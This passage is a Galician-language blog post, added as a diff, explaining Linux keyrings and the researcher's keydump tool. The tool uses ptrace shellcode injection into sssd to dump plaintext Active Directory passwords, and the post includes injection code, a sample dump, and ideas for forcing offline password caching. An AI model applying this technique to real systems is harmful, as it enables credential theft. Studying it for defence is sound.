@@ -1,0 +1,828 @@
+#+title: Volcado de keyrings con Keydump: Extraendo credenciais en claro de SSSD
+#+author: Eloy Pérez González
+#+date: 2024-08-31
+#+tags[]: linux keyrings sssd
+#+toc: True
+
+Boas xente!!
+
+Fai tempo estiven trangallando cos [[https://www.man7.org/linux/man-pages/man7/keyrings.7.html][keyrings]] de Linux para extraer tickets de
+Kerberos con [[https://github.com/zer1t0/tickey][tickey]], e recentemente vinme envolto nun novo proxecto no que
+precisaba volver a aprender sobre o tema, así que vou a describir aquí o
+proxecto e os conceptos mais relevantes sobre os keyrings por se eu ou outra
+persoa ten que aprendelos no futuro.
+
+O primeiro que temos que saber é que o que se coñece como keyrings de Linux, é
+un xestor de chaves. As chaves son entidades que poden ser usadas polos
+programas para almacenar segredos, como contrasinais ou certificados, de xeito
+seguro na memoria do kernel, evitando que outros programas ou usuarias poidan
+acceder a eles.
+
+Dito isto, vamos ao tema!
+
+* O comezo
+:PROPERTIES:
+:custom_id: o-comezo
+:END:
+
+O caso é que eu estaba fuchicando un pouco con sssd despois de leer sobre
+[[https://github.com/CiscoCXSecurity/linikatz][linikatz]] e revisando a documentación de [[https://linux.die.net/man/5/sssd-krb5][sssd-krb5]] atopeime ca seguinte nota na
+opción ~krb5_store_password_if_offline~: 
+#+caption:  
+#+begin_src 
+krb5_store_password_if_offline (boolean)
+    Store the password of the user if the provider is offline and use it to request a TGT when
+    the provider comes online again.
+
+    NOTE: this feature is only available on Linux. Passwords stored in this way are kept in
+    plaintext in the kernel keyring and are potentially accessible by the root user (with
+    difficulty).
+
+    Default: false
+#+end_src
+
+Que traducido sería:
+#+caption: 
+#+begin_src 
+krb5_store_password_if_offline (boolean)
+    Garda o contrasinal da usuaria se o proveedor está desconectado e usaá para pedir un TGT
+    cando o proveedor volva estar dispoñible.
+
+    NOTA: esta característica so está dispoñible en Linux. Os contrasinais almacenados deste
+    xeito manteñense en texto claro no keyring do kernel e son potencialmente accesibles pola
+    usuaria root (con dificultade).
+
+    Por defecto: false
+#+end_src
+
+Aquí hai que ter en conta varias cousiñas:
+
+Primeiro, e tal vez o mais importante, é que *os contrasinais almacenanse en
+texto claro* nos keyrings. Na documentación tamén se indica que poden ser
+accedidos pola usuaria root con dificultade. Pero, que significa dificultade?
+Dende o meu punto de vista quere dicir que non hai todavía ningunha ferramenta
+para facelo, así que iso é o que me propuxen facer.
+
+Outro feito importante é que os contrasinais so se almacenan *cando o proveedor
+está desconectado*. Nun escenario de Active Directory (AD), isto significa que
+os contrasinais so se gardarán cando non se poida conectar co Controlador de
+Dominio (DC), polo que o ataque é menos plausible. Sen embargo, se somos root na
+máquina podemos forzala a perder conectividade co Controlador de Dominio
+aplicando unha regra no firewall, por exemplo, de modo que poidamos recolectar
+contrasinais dos novos usuarios que inician sesión na máquina. Non obstante,
+para este propósito seguramente sexa máis fácil e fiable crear un módulo falso
+de PAM. Dito isto, eu fíxeno igualmente pola diversión do reto.
+
+E por último pero non por elo menos importante, o valor por defecto da opción
+~krb5_store_password_if_offline~ é ~false~. Isto significa que se non se
+especifica esta opción as contrasinais non se van a almacenar. Sen embargo, por
+defecto [[https://linux.die.net/man/8/sssd][sssd]] pon esta opción a ~true~, así que non temos problema.
+
+Polo tanto para extraer os contrasinais precisaba unha ferramenta capaz de
+extraer as chaves dos keyrings doutros procesos. Como dixen antes, isto é algo
+que xa fixera cando creei [[https://github.com/zer1t0/tickey][tickey]], mais esta ferramenta está moi orientada a
+tickets de Kerberos. Polo que pensei que tocaba crear unha ferramenta mais
+xenérica para extraer todas as chaves contidas nos keyrings de calquera proceso
+(ou fío) sen importar o propósito.
+
+Así é como naceu [[https://github.com/zer1t0/keydump][keydump]][fn:keydump], e no resto do artigo vou explicar os conceptos detrás
+de keydump para que podamos entender a súa funcionalidade.
+
+Pero para os mais impacientes xa vos dexio por aquí un adianto de como keydump
+nos permite extraer as chaves onde se gardan os contrasinais, neste caso do
+proceso sssd:
+
+#+caption: Extracción de credenciais de sssd con keydump
+#+begin_src 
+$ ps -o pid --no-headers -C sssd | sed 's/ //g' | sudo ./keydump -
+[PID 452] Shellcode injected
+[PID 452] /tmp/k_452 exists, so keys must be dumped!!
+$ sudo cat /tmp/k_452/210e3b29_user_Administrator_dev_lab__10
+S3cur3p4ss
+#+end_src
+
+* O problema
+:PROPERTIES:
+:custom_id: o-problema
+:END:
+
+Así que queremos extraer as chaves dos keyrings doutros procesos? O problema é
+que están deseñadas xusto para evitar isto.
+
+As chaves de Linux pódense crear de xeito que so o propio proceso (ou incluso
+fío) que as creou poida leelas. No caso de sssd, podemos ver como se crea a chave
+na seguinte liña da función [[https://github.com/SSSD/sssd/blob/077d2993a1b306e7cfe61618cbd5d03c602572f8/src/providers/krb5/krb5_delayed_online_authentication.c#L287][add_user_to_delayed_online_authentication]]:
+
+#+caption: Código de sssd para gardar un contrasinal nunha chave
+#+begin_src c
+    new_pd->key_serial = add_key("user", new_pd->user, password, len,
+                                 KEY_SPEC_SESSION_KEYRING);
+#+end_src
+
+Para que nos entendamos, sssd está usando unha chave que so pode ser lida por
+procesos da súa mesma sesión (non unha sesión de usuario, senón unha
+[[https://www.informit.com/articles/article.aspx?p=397655&seqNum=6][sesión de procesos]] creada con [[https://www.man7.org/linux/man-pages/man2/setsid.2.html][setsid]]). Polo tanto, poderíamos seguir unha
+aproximación semellante á que usei con [[https://github.com/zer1t0/tickey][tickey]], que é inxectar un novo proceso
+nesa sesión acoplándonos con [[https://www.man7.org/linux/man-pages/man2/ptrace.2.html][ptrace]] a sssd e forzalo a facer un [[https://www.man7.org/linux/man-pages/man2/fork.2.html][fork]] para crear
+un novo proceso que volcará as chaves por nos. Porén, nesta ocasión a miña
+aproximación foi intentar extraer as chaves dende o propio proceso de sssd por
+varias razóns:
+
+- Pode que no futuro se modifique esta chave e so poda ser accedida polo propio
+  proceso.
+
+- Extraer dende o propio proceso permitirá que a ferramenta se poda usar para
+  outros programas que so permitan ao propio proceso leer a chave.
+
+- E a razón de verdade, porque quería facelo así e verificar se o podía facer
+  inxectando unha shellcode baseada no meu proxecto [[https://github.com/zer1t0/shellnova][shellnova]].
+
+Imos a ver como se pode facer isto.
+
+#+begin_quote
+Destacar que en Linux, os fíos impleméntanse como procesos lixeiros, polo que
+cada un pode ter as súas propias credenciais. Esta é a razón pola que os fíos
+poden ter chaves que so sexan accedidas por eles.
+
+Isto tamén significa que inxectar código nun fío é o mesmo que inxectalo nun
+proceso, soamente precisamos especificarlle o TID (ID do fío) no canto do PID á
+syscall ~ptrace~. De feito, cando falamos de PID, simplemente estamos a
+referirnos ao TID do fío principal do proceso.
+#+end_quote
+
+* Keyrings
+:PROPERTIES:
+:custom_id: keyrings
+:END:
+
+O primeiro que temos que saber é como se extraen as chaves dun proceso, que como
+xa mencionei, almacénanse na memoria do kernel. Neste apartado vou intentar
+describir todos os puntos relevantes para o noso propósito, pero que se queres
+mais información podes atopala no [[https://www.man7.org/linux/man-pages/man7/keyrings.7.html][manual de keyrings]].
+
+#+begin_quote
+Gustaríame destacar que as keyrings de Linux non son a única solución de
+keyrings, senon que existen outras como as [[https://wiki.gnome.org/Projects/GnomeKeyring/][keyrings de GNOME]], que non son
+manexadas polo kernel Linux.
+#+end_quote
+
+Para leer o contido dunha chave, precisamos saber o seu ID, xa que o necesitamos
+para realizar a operación ~KEYCTL_READ~ da [[https://www.man7.org/linux/man-pages/man2/keyctl.2.html][syscall keyctl]]. No noso caso queremos
+leer todas as chaves do proceso, así que como podemos obter os seus IDs?
+
+** O ficheiro /proc/keys
+:PROPERTIES:
+:custom_id: o-ficheiro-proc-keys
+:END:
+
+So precisamos leer o ficheiro ~/proc/keys~, que é un pseudo-ficheiro do
+[[https://www.man7.org/linux/man-pages/man5/proc.5.html][sistema de ficheiros proc]] que indica as chaves dispoñibles para o proceso que o
+lee. Aquí temos un exemplo:
+
+#+caption: Chaves dispoñibles para o proceso cat
+#+begin_src
+$ cat /proc/keys
+00c58dad I--Q---    58 perm 3f030000  1000  1000 keyring   _ses: 1
+0ae2c7d1 I--Q---     1 perm 3f010000  1000  1000 user      user_secret: 6
+102e811f I--Q---   104 perm 3f030000  1000  1000 keyring   _ses: 2
+244b527f I--Q---     4 perm 1f3f0000  1000 65534 keyring   _uid.1000: empty
+2729088e I--Q---     1 perm 1f3f0000  1000 65534 keyring   _uid_ses.1000: 1
+#+end_src
+
+Como podemos apreciar, hai unha liña por chave, un formato moi común no mundo
+Unix. En cada liña temos varios campos que describen cada chave. Imos revisalos
+para entendelos.
+
+O primeiro campo é o *ID da chave*, tamén chamado número de serie, que
+identifica de forma única a cada chave. Esta é a información que mais nos
+interesa do ficheiro, pero imos explorar tamén os outros campos.
+
+O segundo campo son as *flags de estado* de cada chave. O que precisamos
+comprobar aquí é que teña a flag ~I~, que indica que a chave está instanciada,
+ou sexa, que foi creada. Isto igual soa raro porque, non está todas as chaves
+creadas? Non necesariamente, xa que algunhas chaves poden ser pedidas e ter que
+ser creadas por outro programa, como se describe en [[https://www.man7.org/linux/man-pages/man2/request_key.2.html][request_key(2)]], e nese caso
+estarán "en construcción" ata que se creen, o que se indica ca flag ~U~.
+
+O terceiro campo coñecido como *uso*, indica cantos enlaces apuntan á
+chave. Unha chave pode estar enlazada por un keyring, que é un tipo de chave
+especial que ten enlaces a outras chaves, algo así coma unha carpeta.Se unha
+chave, incluidos os keyrings, perde todos os seus enlaces, é borrada. Por esta
+razón algúns keyrings, os keyrings ancla, precisan ser enlazados dende as
+estructuras do kernel.
+
+O cuarto campo é o *tempo de expiración da chave* e o termo ~perm~
+(permanente) indica que a chave non expira. Unha chave expirada non se pode usar
+e será borrada.
+
+O quinto campo son os *permisos*, que teñen catro conxuntos, un byte por conxunto
+(dous díxitos hexadecimais), que fan referencia ó fío ou proceso posuidor,
+usuaria, grupo e permisos de outras usuarias. Os últimos 3 son semellantes aos
+permisos de ficheiros, pero o posuidor é mais complicado e require unha
+explicación a maiores, que darei abaixo. Ademais, os permisos tamén son
+diferentes dos que podemos atoparnos para os ficheiros.
+
+E despois temos os IDs da *usuaria* e o *grupo* de cada chave, que identifica á
+usuaria e grupo propietarios de cada chave (que non é o mesmo que
+posuidores). Un valor de 65534 (-1 nun enteiro con signo) no campo do grupo
+quere decir que a chave non ten grupo.
+
+O oitavo grupo é o *tipo de chave*. Existen varios tipos de chaves con
+diferentes características, e algunhas delas nin sequeran soportan as operacións
+de lectura polo que o seu contido non se pode obter (alomenos dende o espazo de
+usuario). Os tipos mais comúns de chaves son os seguintes:
+
+- *user*: Un tipo de chave xenérica que permite gardar segredos na memoria do
+  kernel (cun tamaño de ata 32767 bytes) e leelos dende o espazo de usuario.
+
+- *keyring*: Contén enlaces a outras chaves (incluídos outros keyrings). Este é
+  un tipo especial de chave xa que funciona coma unha "carpeta" que permite ás
+  chaves poder ser buscadas pola súa descripción.
+
+- *logon*: É coma a chave user, pero non permite leer os seu contido dende o
+  espazo de usuario.
+
+- *big_key*: É como a chave user, pero permite un contido maior (de ata 1
+  MiB). O tema é que cando o kernel non ten espazo, almacena este tipo de chaves
+  cifradas nun sistema de ficheiros tmpfs.
+
+- [[https://docs.kernel.org/crypto/asymmetric-keys.html][*asymmetric*]] : Permite gardar chaves privadas e públicas, ou so a pública. Non
+  permite operacións de lectura dende o espazo de usuario, pero si cifrado,
+  descifrado, firmado e verificado de firmas.
+
+Existen outros tipos de chaves (como [[https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/certs/blacklist.c#L138][blacklist]], [[https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/crypto/asymmetric_keys/pkcs7_key_type.c#L70][pkcs7]], [[https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/fs/crypto/keyring.c#L173][.fscrypt]], etc) que non
+listo porque non sei o seu propósito, pero se tes curiosidade, podes descubrilas
+buscando polo uso da función "register_key_type" no
+[[https://github.com/torvalds/linux][código fonte do kernel Linux]].
+
+O último campo está composto por dous, que son o *nome ou descripción* da chave,
+que pode usarse para buscar a chave nos keyrings, e *metadatos* con información
+que varía dependendo do tipo de chave, por exemplo, para os keyrings os
+metadatos amosan o número de enlaces que contén, e para as chaves de tipo user
+especifica o seu tamaño en bytes.
+
+Coa información que sacamos do ficheiro ~/proc/keys~ estamos listos para
+intentar volcar o contido de tódalas chaves. A miña forma de proceder foi
+simplemente leer ~/proc/keys~ e tratar de leer todas as chaves listadas, que é
+moito máis fácil que leer os permisos e intentar adiviñar cales se poden leer.
+
+** Os permisos das chaves
+:PROPERTIES:
+:custom_id: os-permisos-das-chaves
+:END:
+
+Así e todo, a pesares de que penso que unha aproximación de forza bruta é unha
+boa decisión para leer as chaves dun proceso, se queremos leer unha chave
+específica, tratar de inxectarnos e tódolos procesos (e fíos) do sistema ata que
+atopemos un que a poida leer tal vez no sexa a mellor decisión, polo que serén
+capaces de entender os permisos dunha chave pode axudarnos a saber en que
+proceso inxectarnos.
+
+Como comentei previamente, os permisos están formados por catro conxuntos, e
+para cada un deles temos os seguintes permisos:
+
+- *view* (0x01): Permite leer os atributos das chaves. As chaves para as que un
+  proceso ten permisos de view son as listadas en ~/proc/keys~.
+
+- *read* (0x02): Permite leer o contido da chave. Con todo, algúns tipos de
+  chaves como "logon" ou "asymmetric" non soportan operacións de lectura.
+
+- *write* (0x04): Permite actualizar o contido da chave e revocala.
+
+- *search* (0x08): Permite que a chave sexa atopada nunha búsqueda, que ven a
+  ser buscar por unha chave a través dos keyrings pola súa descripción/nome.
+
+- *link* (0x10): Permite crear novos enlaces que apuntan á chave.
+
+- *setattr* (0x20): Permite revocar unha chave, cambiar os permisos e o seu uid
+  (id de usuario) e gid (id de grupo), indicar un tempo de expiración e aplicar
+  restriccións nos keyrings (que implica que as chaves engadidas a eles deben
+  estar firmadas).
+
+Ademais, temos os catro conxuntos de permisos que son o posuidor, usuaria, grupo
+e outras. Como nos podemos imaxinar, a usuaria e grupo aplican á usuaria e grupo
+propietarias da chave, e o conxunto outras a calquera outra usuaria.
+
+Imos ver un exemplo dunha liña de ~/proc/keys~:
+#+caption: 
+#+begin_src
+0ae2c7d1 I--Q---     1 perm 3f010000  1000  1000 user      user_secret: 6
+#+end_src
+
+Podemos observar que os permisos para a chave ~user_secret~ son ~3f010000~, o
+cal significa que todos os permisos son concedidas ó posuidor, mentres que a
+usuaria so ten permisos de vista e o grupo e outras non teñen ningún.
+
+Ademais, debemos ter en mente que igual que nos ficheiros, *os permisos de
+usuaria, grupo e outras son exclusivos*, o que significa que se a usuaria do
+proceso que intenta acceder á chave é a mesma ca usuaria da chave, os permisos
+de usuaria serán aplicados, e non os permisos de grupo ou outras, incluso se
+estes (por algún curiosos motivo) son mais permisivos cos da usuaria. Pasa o mesmo
+para os permisos de grupo. E no caso de non coincida nin a usuaria nin o grupo,
+aplicaran os permisos definidos para outras usuarias.
+
+Por outra parte temos os *permisos dos posuidores*, que son importantes xa que
+polo xeral os procesos posuidores son as que mais privilexios teñen sobre a
+chave. Pero os permisos dos posuidores son diferentes en varios aspectos:
+
+- *Son inclusivos*: Os permisos de posuidor aplícanse xunto co outro dos
+  tres conxuntos de permisos que se lle aplique ao proceso. Isto significa, que
+  se por exemplo, a un proceso se lle aplican os permisos de usuaria e posuidor,
+  e os permisos de posuidor so permiten escribir, mentres que os de usuaria so
+  permiten leer, entón o proceso poderá leer e escribir.
+
+- *Son dinámicos*: Os permisos de posuidor so se aplican se a chave é posuida polo
+  proceso, e isto calcúlase cada vez que se accede á chave.
+
+Así que, como podemos saber se unha chave é posuida por un proceso? Precisamos
+seguir os enlaces dende os keyrings ancla.
+
+Estupendo, isto deixanos con outra pregunta, *que son os keyrings ancla?* Se fas
+memoria, arriba dixen que cada chave, incluídos os keyrings, precisan ter
+alomenos ser referenciadas unha vez para non serén eliminadas polo kernel. De
+feito, cada vez que se crea unha chave (coa syscall [[https://www.man7.org/linux/man-pages/man2/add_key.2.html][add_key]]) é preciso indicar
+un keyring que conterá un enlace a dita chave (a mesma situación que nos
+ficheiros, xa que precisan ser creados nunha carpeta). Agora imaxina que
+queremos crear o noso primeiro keyring que vai ter os enlaces ao resto de
+chaves, que keyring apuntará ao noso primer keyring? A resposta é un
+[[https://man.archlinux.org/man/keyrings.7.en#Anchoring_keys][keyring ancla]]. *Os keyrings ancla son keyrings especiais que están enlazados a
+estructuras do kernel.* E varios deles, se os combinamos coa posesión de chaves,
+permiten que certas chaves so sexan accesibles dende certos contextos.
+
+Estes son os kernels ancla dispoñibles (que polo xeral son creados polo kernel
+cando son accedidos):
+
+- *Keyrings de proceso*: Estes keyrings están enlazados ás credenciais dos
+  procesos. Existen tres tipos con diferentes ámbitos:
+  + [[https://www.man7.org/linux/man-pages/man7/thread-keyring.7.html][thread-keyring]] (keyring de fío): So pode acceder a él o fío actual. Ten o
+    nome /_tid/.
+  + [[https://www.man7.org/linux/man-pages/man7/process-keyring.7.html][process-keyring]] (keyring de proceso): Poden acceder a él tódolos fíos do
+    proceso. Ten o nome /_pid/.
+  + [[https://www.man7.org/linux/man-pages/man7/session-keyring.7.html][session-keyring]] (keyring de sesión): Poden acceder a él tódolos procesos da
+    sesión do usuario (xa que é creado por [[https://linux.die.net/man/8/pam][PAM]]). Ten o nome /_ses/.
+
+- *Keyrings de usuario*: Estes keyrings están enlazados a estructuras da usuaria
+  no kernel, polo que so poden ser usados mentres a usuaria ten unha sesión
+  activa.
+  + [[https://man7.org/linux/man-pages/man7/user-keyring.7.html][user-keyring]] (keyring de usuaria): Poden acceder a él tódolos procesos da
+    usuaria. O seu nome é /_uid.<uid>/ onde <uid> tense que reemplazar polo uid
+    da usuaria.
+  + [[https://man7.org/linux/man-pages/man7/user-session-keyring.7.html][user-session-keyring]] (keyring da sesión de usuaria): Poden acceder a él
+    tódolos procesos da usuaria. Soamente se usa no caso de que non se creé o
+    keyring de sesión. Ten o nome /_uid_ses.<uid>/ onde <uid> tense que
+    reemplazar polo uid da usuaria.
+
+- [[https://man7.org/linux/man-pages/man7/persistent-keyring.7.html][Persistent keyring]] (keyring persistente): Poden acceder a él todos os procesos
+  da usuaria, pero non se destrúe cando a usuaria finaliza a súa sesión. Está
+  pensado para ser usado por servizos en segundo plano que actúan en nome da
+  usuaria. Ten un tempo de expiración, polo que se non se usa nese tempo
+  elimínase. O seu nome é /_persistent.<uid>/ onde <uid> tense que reemplazar
+  polo uid da usuaria.
+
+Estes son os keyrings ancla que temos no sistema. Son parecidos ao directorio
+raíz dun sistema de ficheiros, sobretodo os keyrings de proceso, que son os
+usados na posesión.
+
+Así que, *que é a posesión?* e como se calcula? A resposta é que unha chave é
+posuída cando esta concede o permiso /search/ e pódese chegar ata ela navegando
+polos enlaces dos keyrings partindo dende o keyring de fío, de proceso ou de
+sesión. Se queres coñecer o algoritmo en detalle podes consultalo na
+[[https://man.archlinux.org/man/keyrings.7.en#Possession][sección Possession de keyrings(7)]].
+
+* Sobre keydump
+:PROPERTIES:
+:custom_id: sobre-keydump
+:END:
+
+Ben, agora que sabemos o que son as chaves e somos conscientes de que algunhas
+chaves so son accesibles den un proceso ou fío, precisamos unha forma de
+extraelas. A mín ocórrenseme dúas posibilidades:
+
+- Executar código no contexto do proceso (ou fío) con acceso a unha chave
+  obxetivo.
+- Leer as chaves dende o espazo de kernel cun módulo de Linux.
+
+Eu decanteime pola primeira opción xa que me era mais fácil ao non estar eu
+familiarizado coa programación de módulos de Linux (pero é un bo proxecto para o
+futuro).
+
+Polo tanto, para executar no contexto doutro proceso podemos comportarnos coma
+un depurador (debugger) e inxectar unha shellcode no proceso. Eu asumo que temos
+privilexios de root, polo que poderemos acoplarnos a calquera proceso coa syscall
+[[https://www.man7.org/linux/man-pages/man2/ptrace.2.html][ptrace]] (salvo que o sistema esté hardenizado).
+
+** A inxección
+:PROPERTIES:
+:custom_id: a-inxeccion
+:END:
+
+Como podemos levar a cabo unha
+[[https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/][inxección de código con ptrace]][fn:linux-process-injection]? Estes son os pasos que eu seguín en keydump
+para inxectar unha shellcode nun proceso:
+
+1. Acoplámonos ao proceso obxetivo
+2. Buscamos unha instrucción syscall
+3. Executamos [[https://www.man7.org/linux/man-pages/man2/mmap.2.html][mmap]] para reservar memoria para a shellcode
+4. Copiamos a shellcode á memoria do proceso remoto
+5. Chamamos á shellcode
+
+Podedes atopar estes pasos na [[https://github.com/zer1t0/keydump/blob/1c0a26a959b4409865a511a5549e1eaad3d3d6d8/src/main.rs#L92][función dump_remote_process_keys de keydump]]. E
+para cada un deles aquí está o código e unha explicación:
+
+*** 1. Acoplámonos ao proceso obxetivo
+:PROPERTIES:
+:custom_id: 1-acoplamonos-ao-proceso-obxetivo
+:END:
+
+#+begin_src rust
+tracer::basics::attach_process(pid)?;
+#+end_src
+
+Este paso require executar unha operación ~PTRACE_ATTACH~ na syscall ptrace e
+agardar que o proceso remoto se pare.
+
+*** 2. Buscamos unha instrucción syscall
+:PROPERTIES:
+:custom_id: 2-buscamos-unha-instruccion-syscall
+:END:
+
+#+begin_src rust
+let syscall_addr = tracer::x64::syscall::search_syscall_inst_nearby(pid)?;
+#+end_src
+
+Nos próximos pasos precisamos chamar á syscall mmap para reservar memoria para a
+shellcode. Iso podemos facelo redirixindo a execución do programa á unha
+instrucción syscall para o cal temos que poñer a dirección da instrucción
+syscall no contador do programa, que é o rexistro ~rip~ en x64.
+
+Polo tanto, precisamos atopar unha instrucción de syscall na memoria do
+proceso. Xa que polo xeral despois de acoplarnos a él, o proceso se detén cando
+chama a unha syscall, eu vou comprobar se este é o caso e gardarme a dirección
+desta instrucción. Noutros casos o meu programa fallará, pero poderíase
+facer un escaneo da memoria para buscar unha instrucción syscall, ou continuar a
+execución do proceso ata que se execute unha syscall (que se pode facer con
+~PTRACE_SYSCALL~). 
+
+*** 3. Executamos mmap para reservar memoria para a shellcode
+:PROPERTIES:
+:custom_id: 3-executamos-mmap-para-reserver-memoria-para-a-shellcode
+:END:
+
+#+begin_src rust
+let mmap_addr = tracer::x64::syscall::exec_mmap_x64(
+        pid,
+        syscall_addr,
+        0,
+        shc.len() as u64,
+        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
+        libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
+        -1,
+        0,
+    )?;
+#+end_src
+
+Para invocar unha [[https://www.man7.org/linux/man-pages/man2/mmap.2.html][syscall mmap]], temos que por o rexistro ~rip~ apuntando á
+instrucción syscall que atopamos e pasarlle os argumentos a mmap establecendo
+os seus valores nos rexistros ~rdi~, ~rsi~, ~rdx~, ~r10~, ~r8~,
+~r9~[fn:linux-syscall-calling-convention]. Temos que ter en conta que precisamos
+reservar unha zona de memoria que nos permita escribir e executar (e leer) para
+escribir e executar a shellcode (ademais, neste caso a nosa shellcode tamén
+require estes permisos para executarse correctamente).
+
+Ora ben, antes de sobreescribir os rexistros, necesitamos gardar os seus valores
+orixinais para restauralos despois. Cando teñamos o respaldo feito, executamos a
+instrucción syscall facendo unha operación single-step que nos permite executar
+soamente unha instrucción (a de syscall) e retomar o control do proceso
+obxetivo. Entón leemos o valor devolto por mmap, que se atopa no rexistro ~rax~,
+e restauramos o valor orixinal dos rexistros para evitar corromper o proceso
+obxetivo.
+
+*** 4. Copiamos a shellcode á memoria do proceso remoto
+:PROPERTIES:
+:custom_id: 4-copiamos-a-shellcode-a-memoria-do-proceso-remoto
+:END:
+
+#+begin_src rust
+tracer::x64::basics::write_memory_x64(pid, map_addr, shc)?;
+#+end_src
+
+Como resultado do mmap, temos reservada unha rexión de memoria para escribir a
+nosa shellcode. Agora podemos transferir a nosa shellcode ao proceso remoto
+escribindo os bytes no pseudo-ficheiro ~/proc/<pid>/mem~, onde o pid é o pid do
+proceso remoto.
+
+*** 5. Chamamos á shellcode
+:PROPERTIES:
+:custom_id: 5-chamamos-a-shellcode
+:END:
+
+#+begin_src rust
+let rip = tracer::x64::register::rip(pid)?;
+
+tracer::x64::basics::stack_push_x64(pid, rip - rip_offset)?;
+
+tracer::x64::register::set_rip(pid, map_addr + rip_offset)?;
+#+end_src
+
+Para chamar á shellcode precisamos poñer no rexistro ~rip~ a dirección onde
+acabamos de copiar á shellcode. Ademais, como tamén queremos restaurar o fluxo
+normal de execución do proceso cando a nosa shellcode termine de executarse,
+insertamos na pila, como dirección de retorno, a dirección da instrucción onde
+se detivo o proceso.
+
+Tal vez te decates de que hai unha variable chamada ~rip_offset~, que é? Cando
+un proceso obxetivo é interrumpido por un acoplamento con ptrace, pode ser que
+estea no medio dunha syscall. Neste caso, o rexistro ~rip~ apuntará á seguinte
+instrucción, pero o proceso necesita continuar na instrucción syscall para
+repetila (xa que non se deu completado) e evitar un comportamento
+inesperado. Isto é precisamente o que fai o depurador ao desacoplarse do proceso
+(operación PTRACE_DETACH), restarlle 2 ao ~rip~ (o tamaño da instrucción syscall
+en x64) para evitar problemas. E para manexar esta situación (non tan) especial
+incluín a variable ~rip_offset~ cuxo valor é 2 cando o proceso se detén nunha
+syscall.
+
+Debido a isto indiqueille que a dirección da shellcode é a dirección devolta por
+mmap mais o desplazamento que será restado cando me desacople do proceso
+obxetivo. Ademais a dirección de retorno debería ser a instrucción
+á que apunta ~rip~, ou no caso da situación previamente descrita, a instrucción
+syscall anterior, polo que hai que restar 2 a ~rip~.
+
+En resumo, o que estamos a facer é simular unha instrucción ~call~ para invocar
+á nosa shellcode (é importante decatarse de que é responsabilidade da
+shellcode, unha vez teña feito o seu traballo, restaurar os valores dos
+rexistros ao seu estado orixinal para que o proceso non pete). Entón, cando a
+dirección de retorno estea posta na pila e ~rip~ apunte á dirección da nosa
+shellcode, debemos desacoplarnos do proceso. Unha vez feito isto, o proceso
+obxetivo continuará correndo, executando a nosa shellcode e finalmente
+recuperando o seu fluxo de execución normal.
+
+*** Paso extra: Comprobamos que o volcado foi feito
+:PROPERTIES:
+:custom_id: paso-extra-comprobamos-que-o-volcado-foi-feito
+:END:
+
+Tras inxectar a shellcode no proceso obxetivo, esta creará un cartafol en ~/tmp~
+que conterá ficheiros cos contidos das chaves lexibles polo proceso remoto. Polo
+tanto, despois de inxectar a nosa shellcode, agardamos un anaco e comprobamos se
+se creou dita carpeta.
+
+** A shellcode
+:PROPERTIES:
+:custom_id: a-shellcode
+:END:
+
+A outra parte importante de keydump é a shellcode a inxectar no proceso
+obxetivo. Para crear a shellcode usei [[https://github.com/zer1t0/shellnova][shellnova]][fn:shellnova], un proxecto meu
+que da unha plantilla para a creación de shellcodes que permite o seguinte:
+
+- Crear a shellcode dende código C
+- Resolución de símbolos da libc, para poder usalos dende a shellcode
+- Borrado do implante unha vez este termina, para non deixar rastro
+
+A shellcode, como xa dixen na sección dos keyrings, listará as chaves lendo o
+ficheiro ~/proc/keys~ e tratará de obter o contido de cada chave e gardalo nun
+ficheiro no cartafol ~/tmp/k_<tid>~ onde ~<tid>~ é o tid do fío obxetivo. Aquí
+vos deixo o código (da función [[https://github.com/zer1t0/keydump/blob/1c0a26a959b4409865a511a5549e1eaad3d3d6d8/implant/src/main.c#L145][dump_keys]]) que se encargará diso:
+
+#+caption: 
+#+begin_src c
+    sprintf_d(keys_dir, "/tmp/k_%d", tid);
+    err = mkdir_z(keys_dir, 0755);
+    if (err != 0 && err != -EEXIST) {
+        LOG_PRINTF("Error mkdir: %d\n", err);
+        goto close;
+    }
+
+    dp = opendir_d(keys_dir);
+    if(!dp) {
+        PRINTF("Error opendir");
+        goto close;
+    }
+    dir_fd = dirfd_d(dp);
+
+    fp = fopen_d("/proc/keys", "r");
+    if(!fp) {
+        PRINTF("Error opening /proc/keys");
+        goto close;
+    }
+
+    while ((nread = getline_d(&line, &len, fp)) != -1) {
+        sscanf_d(line, "%lx %s %d %s %x %d %d %s", &k_id, k_flags, &k_state, k_expiration, &k_perms, &k_uid, &k_gid, k_type);
+        if(read_key(k_id, &key_data, &key_data_size) == 0){
+            desc = extract_description(line);
+            if(!desc) {
+                desc = "";
+            }
+            // printf("%s\n", desc);
+            normalize_description(desc);
+            // printf("Key len of %lu\n", key_data_size);
+            sprintf_d(k_filename, "%lx_%s_%s", k_id, k_type, desc);
+            write_to_file(dir_fd, k_filename, key_data, key_data_size);
+            free_d(key_data);
+        }
+    }
+#+end_src
+
+* Atacando SSSD
+:PROPERTIES:
+:custom_id: atacando-sssd
+:END:
+
+Agora que entendemos como funciona keydump, é hora de realizar o ataque, para o
+cal precisamos unha máquina GNU/Linux unida a Active Directory mediante
+sssd. Non me vou a meter como facer isto, pero podes consultar o seguinte
+tutorial:
+
+- [[https://hackliza.gal/posts/linux-en-ad/][Como unir Debian a Active Directory]]
+
+Despois de montar o laboratorio, deberías ser quen de iniciar sesión mediante
+ssh na máquina obxetivo. Deste xeito:
+
+#+begin_src 
+$ ssh Administrator@dev.lab@lab-debian
+Administrator@dev.lab@192.168.122.241's password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 12 22:39:50 2024 from 192.168.122.254
+administrator@dev.lab@debian:~$ 
+#+end_src
+
+Eu usei a conta ~Administrator~ do meu dominio ~dev.lab~ pero podes usar
+calquera conta.
+
+Unha vez teñas comprobado que podes acceder á máquina por ssh cunha conta de
+dominio, teste que asegurar de que a opción ~krb5_store_password_if_offline~ ten
+o valor ~true~ na túa configuración de sssd (nas opcións de dominio), que é o
+valor por defecto:
+
+#+begin_src
